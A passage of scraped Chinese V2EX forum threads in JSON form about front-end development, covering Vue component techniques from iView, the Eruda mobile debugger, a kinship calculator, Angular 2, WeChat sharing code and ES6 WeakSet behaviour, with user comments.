<code>i-button</code>就被编译了。\n在某些时候使用<code>$compile()</code>确实能带来益处，不过也会遇到很多问题值得思考：</p>\n<ul>\n<li>这样编译容易把作用域搞混，所以要知道是在哪个 Vue 实例上编译的；</li>\n<li>手动编译后，也需要在合适的时候使用<code>$destroy()</code>手动销毁；</li>\n<li>有时候容易重复编译，所以要记得保存当前编译实例的 id ，这里可以通过 Vue 组件的<code>_uid</code>来唯一标识（每个 Vue 实例都会有一个递增的 id ，可以通过<code>this._uid</code>获取）</li>\n</ul>\n<p>另外， Vue 1.x 文档也有提到另一个<code>$mount()</code>方法，可以实现类似的效果，在 Vue 2.x 文档中，有 <code>Vue.compile()</code>方法，用于在 render 函数中编译模板字符串，读者可以结合来看。</p>\n<h3>内联模板<code>inline-template</code></h3>\n<p>内联模板并不是什么新鲜东西，文档中也有说明，只是平时几乎用不到，所以也容易忽略。简短解说，就是把组件的 slot 当做这个组件的模板来使用，这样更为灵活：</p>\n<pre><code>&lt;!-- 父组件： --&gt;\n&lt;my-component inline-template&gt;\n    {{ data }}\n&lt;/my-component&gt;\n\n&lt;!-- 子组件 --&gt;\n&lt;script&gt;\n    export default {\n        data () {\n            return {\n                data: ''\n            }\n        }\n    }\n&lt;/script&gt;\n</code></pre>\n<p>因为使用了 <code>inline-template</code> 内联模板，所以子组件不需要<code>&lt;template&gt;</code>来声明模板，这时它的模板直接是从 slot 来的<code>{{ data }}</code>，而这个 data 所在的上下文，是子组件的，并不是父组件的，所以，在使用内联模板时，最容易产生的误区就是混淆作用域。</p>\n<h3>隐式创建 Vue 实例</h3>\n<p>在 webpack 中，我们都是用 <code>.vue</code> 单文件的模式来开发，每个文件即一个组件，在需要的地方通过 <code>components: {}</code>来使用组件。\n比如我们需要一个提示框组件，可能会在父级中这样写：</p>\n<pre><code>&lt;template&gt;\n    &lt;Message&gt;这是提示标题&lt;/Message&gt;\n&lt;/template&gt;\n&lt;script&gt;\n    import Message from '../components/message.vue';\n    export default {\n        components: { Message }\n    }\n&lt;/script&gt;\n</code></pre>\n<p>这样写没有任何问题，但从使用角度想，我们其实并不期望这样来用，反而原生的<code>window.alert('这是提示标题')</code>这样使用起来更灵活，那这时很多人可能就用原生 JS 拼字符串写一个函数了，这也没问题，不过如果你的提示框组件比较复杂，而且多处复用，这种方法还是不友好的，体现不到 Vue 的价值。\niView 在开发全局提示组件（ Message ）、通知提醒组件（ Notice ）、对话框组件（ Modal ）时，内部都是使用 Vue 来渲染，但却是 JS 来隐式地创建这些实例，这样我们就可以像<code><a href=\"http://Message.info\" rel=\"nofollow\">Message.info</a>('标题')</code>这样使用，但其内部还是通过 Vue 来管理。相关代码地址：\n<a href=\"https://github.com/iview/iview/tree/master/src/components/base/notification\" rel=\"nofollow\">https://github.com/iview/iview/tree/master/src/components/base/notification</a></p>\n<p>下面我们来看一下具体实现：\n<img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/8a5bcd2e2fa0c01d7ed8\">\n上图是最终效果图，这部分 .vue 代码比较简单，相信大家都能写出这样一个组件来，所以直接说创建实例的部分，先看下核心代码：</p>\n<pre><code>import Notification from './notification.vue';\nimport Vue from 'vue';\nimport { camelcaseToHyphen } from '../../../utils/assist';\n\nNotification.newInstance = properties =&gt; {\n    const _props = properties || {};\n\n    let props = '';\n    Object.keys(_props).forEach(prop =&gt; {\n        props += ' :' + camelcaseToHyphen(prop) + '=' + prop;\n    });\n\n    const div = document.createElement('div');\n    div.innerHTML = `&lt;notification${props}&gt;&lt;/notification&gt;`;\n    document.body.appendChild(div);\n\n    const notification = new Vue({\n        el: div,\n        data: _props,\n        components: { Notification }\n    }).$children[0];\n\n    return {\n        notice (noticeProps) {\n            notification.add(noticeProps);\n        },\n        remove (key) {\n            notification.close(key);\n        },\n        component: notification,\n        destroy () {\n            document.body.removeChild(div);\n        }\n    }\n};\n\nexport default Notification;\n</code></pre>\n<p>与上文介绍的<code>$compile()</code>不同的是，这种方法是在全局（ body ）直接使用 <code>new Vue</code>创建一个 Vue 实例，我们只需要在入口处对外暴露几个 API 即可：</p>\n<pre><code>import Notification from '../base/notification';\n\nconst prefixCls = 'ivu-message';\nconst iconPrefixCls = 'ivu-icon';\nconst prefixKey = 'ivu_message_key_';\n\nlet defaultDuration = 1.5;\nlet top;\nlet messageInstance;\nlet key = 1;\n\nconst iconTypes = {\n    'info': 'information-circled',\n    'success': 'checkmark-circled',\n    'warning': 'android-alert',\n    'error': 'close-circled',\n    'loading': 'load-c'\n};\n\nfunction getMessageInstance () {\n    messageInstance = messageInstance || Notification.newInstance({\n        prefixCls: prefixCls,\n        style: {\n            top: `${top}px`\n        }\n    });\n\n    return messageInstance;\n}\n\nfunction notice (content, duration = defaultDuration, type, onClose) {\n    if (!onClose) {\n        onClose = function () {\n\n        }\n    }\n    const iconType = iconTypes[type];\n\n    // if loading\n    const loadCls = type === 'loading' ? ' ivu-load-loop' : '';\n\n    let instance = getMessageInstance();\n\n    instance.notice({\n        key: `${prefixKey}${key}`,\n        duration: duration,\n        style: {},\n        transitionName: 'move-up',\n        content: `\n            &lt;div class=\"${prefixCls}-custom-content ${prefixCls}-${type}\"&gt;\n                &lt;i class=\"${iconPrefixCls} ${iconPrefixCls}-${iconType}${loadCls}\"&gt;&lt;/i&gt;\n                &lt;span&gt;${content}&lt;/span&gt;\n            &lt;/div&gt;\n        `,\n        onClose: onClose\n    });\n\n    // 用于手动消除\n    return (function () {\n        let target = key++;\n\n        return function () {\n            instance.remove(`${prefixKey}${target}`);\n        }\n    })();\n}\n\nexport default {\n    info (content, duration, onClose) {\n        return notice(content, duration, 'info', onClose);\n    },\n    success (content, duration, onClose) {\n        return notice(content, duration, 'success', onClose);\n    },\n    warning (content, duration, onClose) {\n        return notice(content, duration, 'warning', onClose);\n    },\n    error (content, duration, onClose) {\n        return notice(content, duration, 'error', onClose);\n    },\n    loading (content, duration, onClose) {\n        return notice(content, duration, 'loading', onClose);\n    },\n    config (options) {\n        if (options.top) {\n            top = options.top;\n        }\n        if (options.duration) {\n            defaultDuration = options.duration;\n        }\n    },\n    destroy () {\n        let instance = getMessageInstance();\n        messageInstance = null;\n        instance.destroy();\n    }\n}\n</code></pre>\n<p>到这里组件已经可以通过<code><a href=\"http://Message.info\" rel=\"nofollow\">Message.info</a>()</code>直接调用了，不过我们还可以在 Vue 上进行扩展：\n<code>Vue.prototype.$Message = Message;</code>\n这样我们可以直接用<code>this.$<a href=\"http://Message.info\" rel=\"nofollow\">Message.info</a>()</code>来调用，就不用 <code>import Message</code> 了。</p>\n<h3>后记</h3>\n<p>Vue 组件开发中有很多有意思的技巧，用好了会减少很多不必要的逻辑，用不好反而还弄巧成拙。在开发一个较复杂的组件时，一定要先对技术方案进行调研和设计，然后再编码。\niView 还有很多开发技巧和有意思的代码，后面有时间我们再继续探讨吧，最近发布的几个版本都有较大的更新，希望大家可以关注和推广 iView 😝：</p>\n<p><strong><a href=\"https://github.com/iview/iview\" rel=\"nofollow\">https://github.com/iview/iview</a></strong></p>\n</div></div>"], "reply": "20", "tittle": "Vue 中你不知道但却很实用的黑科技", "comment": ["扩展 Vue 我们一般是通过 plugin 的方式：\r", "'use strict';\r", "\r", "const i18n = {\r", "    install(Vue, options) {\r", "        Vue.prototype.$lang = (options && options['lang']) || 'cn';\r", "        Vue.prototype.$i18n = k => {\r", "            if(typeof k === 'string') {\r", "                const lang = (options && options['lang']) || 'cn';\r", "                if(window.language_desc && typeof window.language_desc === 'object') {\r", "                    if(window.language_desc[k] && window.language_desc[k][lang] !== undefined) {\r", "                        return window.language_desc[k][lang];\r", "                    } else {\r", "                        return k;\r", "                    }\r", "                }\r", "                return k;\r", "            }\r", "            throw new Error('this.$i18n() receive a string parameter as key!');\r", "        };\r", "    }\r", "};\r", "\r", "export default i18n;\r", "\r", "便于代码管理", "大赞！\r", "\r", "请问，思维导图是用啥工具画的哈？", "噗，命了个名后高大上了好多", "感谢分享  赞一个", "很精致， Stared", "star", "同问思维导图工具。。。", " @", " 同问思维导图工具。。。", "非常酷。\r", "\r", "网站首页感觉好炫啊。", "能不能把 Select 选择器分离出来，现在找到的几个都不太好用", " @", " 思维导图 MindNode", " 多谢。\r", "\r", "希望尽快支持 Vue 2.0 。 加油！", " 暂时依赖的组件比较多，不便于独立。你可以研究下源码自己实现也行", "虽然看不懂，但是感觉给个星就对了，好东西", "mark 一下", "先+1s,\r", "然后 ", " ,在空白处或动作按钮上多次点击会多次触发事件", "其实有些并不是黑科技，大家不知道也完全是因为没有仔细阅读官方文档。。比如 v-model 的利用，文档里写的很明白，它只是 <tag :value=\"prop\" @", "=\"prop = arguments[0]\">的语法糖了。。可惜大部分人（我身边就是有一大堆。。）根本不仔细看文档。。得亏了有 po 主这样的有心人总结罗列了。。", "很赞，已经 fork 了 iview 源码在细看", "大多数人看到还是基于 1.0 的组件就直接放弃了，迁移到 2.0 也不是什么大工程，希望尽快支持 2.0 吧 。 加油", "为啥 template 要直接给 html 字符串呢……感觉好蛋疼"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一款类似微信、 QQ 空间图集查看器 js 插件</p>\n<p>使用说明： <a href=\"https://github.com/chjtx/JRoll/tree/master/plugins/jroll-viewer\" rel=\"nofollow\">https://github.com/chjtx/JRoll/tree/master/plugins/jroll-viewer</a></p>\n<p>示例：打开[<a href=\"http://www.chjtx.com/JRoll/\" rel=\"nofollow\">http://www.chjtx.com/JRoll/</a>](JRoll 官网)，扫一扫二维码，选择 JRollView 示例</p>\n</div></div>"], "reply": "1", "tittle": "JRoll 发布 v2.4.2 新增图集查看器插件 JRollViewer", "comment": ["前些天关注过"]},
{"content": ["<div class=\"topic_content\"><img src=\"http://ww1.sinaimg.cn/large/6e17cf7agw1f9p9z6bpoqj203t0azmxd.jpg\" class=\"embedded_image\" border=\"0\"> </div>"], "reply": "2", "tittle": "用 js 如何实现按上下按钮滚动 li 呢？", "comment": ["我这有两个 js 封装类，你可以看看，学习一下\r", "1 、 ", "\r", "2 、 ", "这么问问题不会有人回答你的    至少你要把代码贴出来让我们知道哪儿有问题 然后才能帮你解决  不然你来这里是来干吗的   伸手党求 demo ?   那还是出门左转插件库里面找去吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/liriliri/eruda\" rel=\"nofollow\">https://github.com/liriliri/eruda</a></p>\n<p>距上次<a href=\"https://www.v2ex.com/t/276399\" rel=\"nofollow\">发贴</a>已过去半年，最新版本为 v1.1.3 ，期间做了不少改进，经常做 app 内嵌 WebView 开发的小伙伴们可以试下:)</p>\n<p><a href=\"https://badge.fury.io/js/eruda\" rel=\"nofollow\"><img alt=\"npm version\" src=\"https://badge.fury.io/js/eruda.svg\"></a></p>\n<p>Eruda 是一个专为手机网页前端设计的调试面板，类似 DevTools 的迷你版，其主要功能包括：捕获 console 日志、检查元素状态、显示性能指标、捕获 XHR 请求、显示本地存储和 Cookie 信息、浏览器特性检测等等。</p>\n<h2>功能清单</h2>\n<p><img alt=\"Eruda\" src=\"http://7xn2zy.com1.z0.glb.clouddn.com/eruda_screenshot3.jpg\"></p>\n<ol>\n<li>\n<p>按钮拖拽，面板透明度大小设置。</p>\n</li>\n<li>\n<p>Console 面板：捕获 Console 日志，支持 log 、 error 、 info 、 warn 、 dir 、 time/timeEnd 、 clear 、 count 、 assert 、 table ；支持占位符，包括%c 自定义样式输出；支持按日志类型及正则表达式过滤；支持快捷命令加载 underscore 、 jQuery 库；支持 JavaScript 脚本执行。</p>\n</li>\n<li>\n<p>Elements 面板：查看标签内容及属性；查看应用在 Dom 上的样式；支持页面元素高亮；支持屏幕直接点击选取；查看 Dom 上绑定的各类事件。</p>\n</li>\n<li>\n<p>Network 面板：图表显示页面加载速度；查看页面各资源请求时间（ Android ）；捕获 XHR 请求，查看发送数据、返回头、返回内容等信息。</p>\n</li>\n<li>\n<p>Resources 面板：查看并清除 localStorage 、 sessionStorage 及 cookie ；查看页面加载脚本及样式文件；查看页面加载图片。</p>\n</li>\n<li>\n<p>Sources 面板：查看页面源码；格式化 html ， css ， js 代码及 json 数据。</p>\n</li>\n<li>\n<p>Info 面板：输出 URL 及 User Agent ；支持自定义输出内容。</p>\n</li>\n<li>\n<p>Snippets 面板：页面元素添加边框；加时间戳刷新页面；支持自定义代码片段。</p>\n</li>\n<li>\n<p>Features 面板：浏览器常用特性检测；提供 Can I use ， Html5Test 快捷访问。</p>\n</li>\n</ol>\n<h2>快速上手</h2>\n<p>通过 npm 安装：</p>\n<pre><code>npm install eruda --save\n</code></pre>\n<p>在页面中加载脚本：</p>\n<pre><code>&lt;script src=\"node_modules/eruda/eruda.min.js\"&gt;&lt;/script&gt;\n&lt;script&gt;eruda.init();&lt;/script&gt;\n</code></pre>\n<p>Js 文件对于移动端来说略重（ gzip 后大概 80kb ）。建议通过 url 参数来控制是否加载调试器，比如：</p>\n<pre><code>;(function () {\n    var src = 'node_modules/eruda/eruda.min.js';\n    if (!/eruda=true/.test(window.location) &amp;&amp; localStorage.getItem('active-eruda') != 'true') return;\n    document.write('&lt;scr' + 'ipt src=\"' + src + '\"&gt;&lt;/scr' + 'ipt&gt;');\n    document.write('&lt;scr' + 'ipt&gt;eruda.init();&lt;/scr' + 'ipt&gt;');\n})();\n</code></pre>\n<p>初始化时可以传入配置：</p>\n<ul>\n<li>container: 用于插件初始化的 Dom 元素，如果不设置，默认创建 div 作为容器直接置于 html 根结点下面。</li>\n<li>tool ：指定要初始化哪些面板，默认加载所有。</li>\n</ul>\n<pre><code>var el = document.createElement('div');\ndocument.body.appendChild(el);\n\neruda.init({\n    container: el,\n    tool: ['console', 'elements']\n});\n</code></pre>\n<p>该工具支持自行编写插件，可参考<a href=\"https://github.com/liriliri/eruda-fps\" rel=\"nofollow\">eruda-fps</a>。</p>\n<h2>Demo</h2>\n<p><img alt=\"Demo\" src=\"http://7xn2zy.com1.z0.glb.clouddn.com/eruda_qrcode2.png\"></p>\n<p>请扫描二维码或在手机上直接访问：<a href=\"http://liriliri.github.io/eruda/\" rel=\"nofollow\">http://liriliri.github.io/eruda/</a></p>\n<p>如果想在其它页面尝试，请在浏览器地址栏上输入以下代码。</p>\n<pre><code>javascript:(function () { var script = document.createElement('script'); script.src=\"//liriliri.github.io/eruda/eruda.min.js\"; document.body.appendChild(script); script.onload = function () { eruda.init() } })();\n</code></pre>\n</div></div>"], "reply": "2", "tittle": "Eruda: 手机网页调试利器", "comment": ["感谢分享", "赞一个！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>几个月前分享过一次，网友们也找了不少……最近感觉越来越稳定了，求帮忙再测试下～\n太小众的，有歧义的，或者只有个别地方才有的称呼不保证支持。。\n地址： <a href=\"http://passer-by.com/relationship/\" rel=\"nofollow\">http://passer-by.com/relationship/</a></p>\n</div></div>"], "reply": "135", "tittle": "亲戚关系计算器求找 bug", "comment": [" 关系之间用‘的’字隔开", " 确实不熟啊！你确定你能活着见到吗？", " \r", " \r", "\r", "确实不熟啊！你确定你能活着见到？？？这不是 bug", " 同性关系不在考量之中", " 我贴的那段，是用你的计算器生成的。。。乱点一通，就这结果 了。。。", " 您能仔细获取一下论点嘛！", " 同性关系不可输入，如果是你点击输入的话，具体是什么步骤呢？", " 我真的不知道你要表达什么，是缺什么数据吗？“堂姑表舅姥爷”的数据确实没有呀，可是你为什么还列出我有的数据呢？……所以不清楚你要表达什么啊", "爸爸的妈妈的老婆    这个都能点出来    这个绝对是 BUG\r", "\r", "点击顺序：\r", "\r", "1 点“父”\r", "2 点 “母”\r", "3 点 “对方称呼我”\r", "4 点 “妻”\r", "\r", "然后输入框就变成了   “爸爸的妈妈的老婆”", " 呃，我现在也重现不出来了，昨天一顿乱点的结果。。。", "要说是标准称喟，媳妇就绝对错误了。\r", "\r", "媳妇 ：儿子的妻子。也叫儿媳妇。（详见《现代汉语词典》）", " 地方不一样，叫法也不一样……这里排除一些歧义的叫法；有些地方“太太”是爸爸的奶奶，但更多地方是老婆。“媳妇”标准应该就是老婆，口语上为方便称“儿媳妇”为“媳妇”……", " 我给你的恰恰就是标准的，是来源于词典、各种百科的，恰恰就是你们都错了。\r", "媳妇=儿媳妇，都是一个词，你们非要分成两个词来分开解释。\r", "关于这个词你们这般错误使用，当年看小说可真恶心死我了，怎么都是乱伦的。", " 我的标准就是媳妇就是老婆，儿媳妇就是儿子的老婆", " \r", "“我真的不知道你要表达什么，是缺什么数据吗？“堂姑表舅姥爷”的数据确实没有呀，可是你为什么还列出我有的数据呢？……所以不清楚你要表达什么啊”\r", "\r", "简直和你无法交流，我有提过缺数据的事儿？“堂姑表舅姥爷”怎么就“确实没有数据”了，我列出的内容怎么就是你有的数据了？\r", "\r", "是你前面说“不存在堂姑表舅姥爷”，我才给你讲讲这是什么亲戚。和你这种人说这么多我也是醉了，拜拜。", "楼主这个产品不错，挺有用的，就是不知道权威性如何？另外，操作和输出优化一下就更好了", " 呵呵，你的标准就是宇宙第一标准，词典、百科都是笑话？！\r", "跟楼上的楼上一样，和你这种人说这么多我也是醉了，拜拜。", " 你这个亲戚关系数据哪里来的呢？我得看看可不可信啊", " 我们这都是这么认为的，怎么了？？？", " 百科要改随时可以改，我是收集我所接触到的资料的，大多数什么情况就用什么", "妈妈的弟弟的老婆的哥哥的儿子 为什么不熟？我和他跟兄弟一样啊", "儿子的儿子的儿子的大爷  还是儿子？", " 当然啊，大爷是爷爷的哥哥，儿子的儿子就是孙子，孙子的大爷就是自己的哥哥，儿子的哥哥就是儿子；那么：\r", "儿子的儿子的儿子的大爷 = 儿子的孙子的大爷= 儿子的哥哥 = 儿子", " 熟悉不代表有亲戚关系啊！我这个是亲戚关系计算器，没什么关系的也只是说“可能不熟悉”……\r", "妈妈的弟弟的老婆的哥哥的儿子 = 舅妈的侄子；确实和你没什么亲戚关系", " \r", "大爷是称呼语，有两种发音， (dà yé）和（ dà ye ），两种含义。大为去声、爷为阳平，指代祖父的哥哥。在北方方言中，爷为轻声，用来称呼父亲的哥哥。又是对对老年男性长辈的尊称。在四川方言中，和“大爷爷”一个意思，比如“二爷爷”叫“二爷”，三爷爷叫“三爷”\r", "from 百度百科。我是北方的，看到这个答案也是一愣。大爷这个称呼第一反应是父亲的哥哥。答案对此能区分开就好了。", " \r", "外祖父。", " \r", "为什么？\r", "亲戚关系计算器本来就是用于生活中亲属关系太复杂的。", "竟然不能选弟弟的老公 0.0", " 有歧义了，我就不加了", " 你弟弟是 gay 吗？？？", " 不能歧视同胞", " \r", "字典里面看见的。不是新华字典，是比新华字典收录多很多的那种字典。", "有点意思", "如果前边有个的，再点击的时候      爸爸的的哥哥 ，会多一个的，是否应该判断一下。", " 输入格式错误，不判断！如果这样的话乱套了，还有“的的的的”"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://hackernoon.com/how-it-feels-to-learn-javascript-in-2016-d3a717dd577f\" rel=\"nofollow\">https://hackernoon.com/how-it-feels-to-learn-javascript-in-2016-d3a717dd577f</a></p>\n<p>哈哈哈，全篇吐槽，还有几句高级黑。读完真的是苦笑。</p>\n</div></div>"], "reply": "20", "tittle": "How it feels to learn JavaScript in 2016", "comment": ["何其相似...", "-Ever heard of Python 3?\r", "\r", "笑出声，不过 python 社区也在迁移了。", " 我看到最后也笑出声，哈哈哈", "全文看完，看到最后一句同样笑出声了 2333333\r", "简直生动形象，昨天大家都在用 gulp 今天就全用 webpack 了，昨天还在用的 promise 今天就变成 async/await 了（苦笑）", "不是很懂最后一句的梗？有人能解释一下吗？", "新做了个基于 vue2 全家桶的东西， 1/3 在配环境， 1/3 在看文档，剩下 1/3 中又只有一半在真正写代码，另一半在纠结 vue2 的 bug", "有翻译版没有?", "不能就因为几个语法糖，几个框架，几个工具就被难倒了吧？", "吐槽了 js 各种库、 js 版本，各种工具后，居然加入 py2 和 py3 的梗～\r", "\r", "-I hear you. You should try the Python community then.\r", "\r", "Why?\r", "\r", "-Ever heard of Python 3?", " vue2 入坑中", "mark 待译", "2016 年最多吐槽一下各个库的升级版,  我看把这文章的 2016 改成 2015 也没什么问题", "黑得好，黑的妙，黑得呱呱叫", " 来添把火", "\r", "\r", "为什么一天前我发了没人理我", "你们的英语都好好啊。。。居然都能看懂笑话。。", " 头像问题，这里的人一看到女性头像就来劲～", " 头像问题，你知道雷姆吗？", " 因为没 at 我吧", "前端都这么复杂了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://angular.io/\" rel=\"nofollow\">https://angular.io/</a></p>\n<p>不过国内前端界似乎已经是 React 和 Vue 的天下了...</p>\n</div></div>"], "reply": "35", "tittle": "Angular 2.0 正式 Release 了", "comment": ["是吗， git 上好像没有显示哦", " 有的\r", "哦 这个就是传说中，日盼夜盘的 正式版吗", "感谢分享", "和 React 相比 Vue 的坑很大，虽然文档好，语法简单，却也架不住 bug 多。", "顶上去", "但这个人气足啊， vue 人气不足这个， 人多了， bug 很快就被修补了", "前端届现在的霸主其实还是 jQuery ，我认识的前端工程师，大部分不会 React/Vue/Angular 。", "太慢", "太晚了。", "昨天还是 RC7", " vue 的 bug 哪多了", "早已没兴趣了，而且和一代都不是一个东西了", "虽然迟了点，但还是支持", "还是可以支持一下的。\r", "打算业余项目玩玩，说不定有惊喜。", "前端现在早废了 大部分还在 jquery", "感觉国内都没有 Angular 的氛围阿 一直在用， 感觉 final release 基本和 rc7 没什么大区别 基本已经成型", "还在用 1 的路过，加上 redux ， webpack 之后，感觉就差个 ng-loader 了", "中文通告 ", " 佩服", " 应该很多公司用 ionic 吧", "支持支持～", " \r", " \r", "我也想问 vue 坑在哪方面？", "未关闭的 issue 超过 1000 + , ng2 用户都是猛士", " 比如说什么 bug", " \r", "![]( ", " )\r", "![]( ", " )\r", "![]( ", " )\r", "人家 issue 基数大呀。", " \r", " \r", " \r", " ", " \r", " \r", " \r", "可能是我不会用吧！做了一个逻辑比较复杂的组间，分别试着用 vue 和 react 。 react 写起来啰嗦，写错了有提示； vue 写起了看起来很简单，但是组间无法按我写逻辑运行，系统却没有提示有任何错误：也就是系统认为的逻辑，和系统文档中展现出来的逻辑之间是有出入的，而且刚好被我碰到了。", " 说明你的前段圈子不行啊", "不能接受 typescript  - -", "有幸正在做 angulars2.0 的实际项目\r", "我只想说, google 的产品除了 chrome, 都是垃圾", " 你的前端圈子不行", " 5 年前还说得过去，现在做前端不会 Angular 、 React 。。。真能呵呵。", " 占比还大了。。", "  你的圈子有点问题呀   angular2 必须要学习啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"http://ww1.sinaimg.cn/mw690/699d3e11gw1f784xe6h8ij209f04pweu.jpg\" src=\"http://ww1.sinaimg.cn/mw690/699d3e11gw1f784xe6h8ij209f04pweu.jpg\"></p>\n<p>Demo 地址： <a href=\"http://7xr7a3.com1.z0.glb.clouddn.com//demo/area_selector.html\" rel=\"nofollow\">http://7xr7a3.com1.z0.glb.clouddn.com//demo/area_selector.html</a></p>\n</div></div>"], "reply": "3", "tittle": "Vue Demo 不到百行代码超简单的地区选择器", "comment": ["数据不够新，天津已经没有县了", " \r", "\r", "我的数据是从这里来的… ", "\r", "国家都还没更新呢，我真不知道要去哪里找最新数据 TnT", " 实现与数据完全无关，数据应该由相关人员提供 API ， JS 只负责展示而已"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>完全根据微信 jssdk 文档写的。\nwx.ready(function () {</p>\n<pre><code>   // 朋友圈分享\n\n        wx.onMenuShareTimeline({\n        title:\"\", // 分享标题\n         link: domainName + serverProjectName + '/OAuthForward.php?OAuthCode=scancode&amp;isOAuth=Y', // 分享链接\n         imgUrl: domainName + projectName + '/img/default.jpg', // 分享图标\n         success: function () {\n             //alert(\"分享成功\")\n             // 用户确认分享后执行的回调函数\n         },\n         cancel: function () {\n             // 用户取消分享后执行的回调函数\n             //alert(\"取消分享\")\n         }\n    });\n   //---------------------------微信分享-----------------------------\n    wx.onMenuShareAppMessage({\n        title: '快快加入', // 分享标题\n        desc: '小伙伴们邀请你加入', // 分享描述\n        link: domainName + serverProjectName + '/OAuthForward.php?OAuthCode=scancode&amp;isOAuth=Y', // 分享链接\n        imgUrl: domainName + projectName + '/img/default.jpg', // 分享图标\n        type: 'link', // 分享类型,music 、 video 或 link ，不填默认为 link\n        dataUrl: '', // 如果 type 是 music 或 video ，则要提供数据链接，默认为空\n        success: function () {\n            //alert(\"分享成功\")\n            // 用户确认分享后执行的回调函数\n        },\n        cancel: function () {\n            // 用户取消分享后执行的回调函数\n            //alert(\"取消分享\")\n        }\n    });\n\n})\n</code></pre>\n</div></div>"], "reply": "3", "tittle": "微信分享至朋友正常工作，分享至朋友圈不能工作，有 V 友遇到类似的问题吗", "comment": ["title 为空导致的？", "你的 jsapi_ticket 申请的时候带上“朋友圈”的 scope 了吗？", " 是这个原因了。 jsApiList 是前阵子写的。然后朋友圈这个接口是最近要加上的。忘了声明了。多谢"]},
{"content": ["<div class=\"topic_content\">function oneMenu() {\r<br>    var main = document.getElementById(\"oneMenu\");\r<br>    var links = main.getElementsByClassName(\"cc-tree-item\");\r<br>    for (var i = 0; i &lt; links.length; i++) {\r<br>        links[i]. onclick = function () {\r<br>            addClass(this, \"cc-selected cc-focused\")\r<br>        }\r<br>    }\r<br>}\r<br>\r<br>想在点击一个元素时，删除其他同级元素的 \"cc-selected cc-focused\" class 。现在点击能追加样式，可不能删除</div>"], "reply": "13", "tittle": "帮忙看一段 js 代码", "comment": ["```\r", "links[i]. onclick = function () { \r", "          addClass(this, \"cc-selected cc-focused\") \r", "};\r", "```\r", "\r", " 这里的 this 指向的是全局 而不是你希望的 links[i]，这里弄个闭包吧", "循环中创建闭包是最常见的 JavaScript 大坑之一，参见\r", "\r", "\r", "\r", "另外，你这代码哪儿有 「删除样式」的逻辑？", "实现这种完全不需要遍历元素啊，楼主在动动脑子。你只需要记录一个当前高亮节点，并且在单击的时候重新指向新的当前节点", "1 ， 2 楼确定？我记得时间处理函数的 this 就是 node 元素， lz 用法并没有问题。", " 是的，我的错~看到循环闭包就觉得有问题，这里的 this 没问题", "因为你没有清除 ；你在上面加一行  清楚所有那个的样式", "links[i]. onclick = function () {\r", "//这个去除所有的按钮样式\r", "addClass(this, \"cc-selected cc-focused\")\r", "}", "这里的 this 并没有问题", "没看到清除的代码", "没有删除样式的代码\r", "\r", "楼主可以递归 this 的 previousElementSibling 跟 nextElementSibling ，或者找 parentNode 的 children", "点击高亮么？\r", "只要结构好 js 都不用写 纯 css+html 的 radio 标签就可以实现", "links[i]. onclick = function () { \r", "//先删除所有\r", "[].slice.call(links).forEach(function(link){link.classList.remove('cc-selected', 'cc-focused')});\r", "addClass(this, \"cc-selected cc-focused\") \r", "}", " 总得有一个取消上一个高亮节点的处理吧？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>ES6 的 WeakSet 不能遍历内部的对象，内部的对象也不保持引用，所以 GC 的时候会删除，而且 key 一定是对象不能是简单类型。</p>\n<p>那么问题来了，比如 WeakSet 的 has(key)这个方法，假如 key 被 GC 了，我根本不可能拿到这个 key 了，怎么可能再传给 has 这个方法呢。</p>\n<p>求指教。。。</p>\n</div></div>", "<div class=\"topic_content\">我想做一个 int-&gt;Object 的 WeakMap ， Object 随系统回收。本来想如果 WeakMap 查不到这个 id 就认为对象被回收了，就忽略掉。后来发现 WeakMap 要求 key 只能是对象，那就考虑 WeakSet ，假如 WeakSet 遍历，看看有没有对应 id 的 Object 就好了。然后发现 WeakSet 不能遍历。。。。\r<br>\r<br>我只想说从来没有见过这么鸡肋的 Weak 类设计， ES 标准组都是吃屎的么。</div>"], "reply": "13", "tittle": "ES6 的 WeakSet 的 has 有什么用", "comment": ["你还能传给 has 说明没有被 GC （", " 所以啊， weakset 跟 set 也就一样了", " 我写的 js 还没用到这些高端类型；\r", "不过我写 python 的时候用过 weakref.WeakKeyDictionary ，当这个 dict 里面的对象在其他地方被回收了之后，这个 dict 里面就没有这个对象了。\r", "用 Dict 可以不行，一直存在。", "为什么没有用，你拿着这个对象只说明它没被回收，不等于有曾经被放进去过", " 请问怎样使用 has 这个方法，请举个例子", " 以前写过 Java ， Java 的 Weak 类也不要求 key 必须是对象，而且可以遍历， Python 的我看了一下也是类似的。真没见过 ES 这样设计 Weak 类的，脑子注水了么。", "我感觉 LZ 你这个思路有问题， Week 系列的想法是在原本这些东西的基础上所操纵的东西引用没有计数，因为元素的引用没计数，所以导致了一些问题，比如不能用 Str 作 key ，不能遍历等等，原有类的功能还是尽可能保留的，能明白我的意思么。。", " 我不明白 key 要求必须是 Object ，而且不能遍历。 Map 和 Set 都是可以遍历的，这个重要的功能就没有。", " 你是不是理解错了，请回去再看一次 Java 的 WeakHashMap 的文档，上面写的非常清楚，是 weak keys 而不是 values", "weak map 本来就不是设计给这种性质的 cache 用的，请回去多看一次 LinkedHashCache 的文档，有教你怎么利用 LinkedHashCache 来实现一个 LILO 或者 LIFO 的 cache 的， weak map 从来就不是设计给你自以为是的场景使用的，还口出不逊，真是智商堪忧", " ok. Java 的 WeakHashMap 确实是 weak key ，但是没有限定必须是 object ，而且判断等价可以重载 isEqual ，而且可以遍历。 ES 都没有。", " 本来想说 RTFM 的，但觉得还是解释一下比较好。你说的没错， js 不能和 Java 相比，因为它本来就是个残缺的语言，虽然有了 WeakMap 但因为缺少 WeakReference 以及真正意义的 HashMap ， WeakMap 是不能用来实现支持 gc cache 的，要想自己实现 cache ，还是只能自己去维护生命周期吧，因为 WeakMap 本来就不是为 cache 而设计的，可以参考 ", " 以及 design goal ", "\r", "\r", "Java 的 weakmap 设计用途也是类似的，只不过文档也提到， WeakHashMap 除了主要用于设计给 identity equaly 的 key 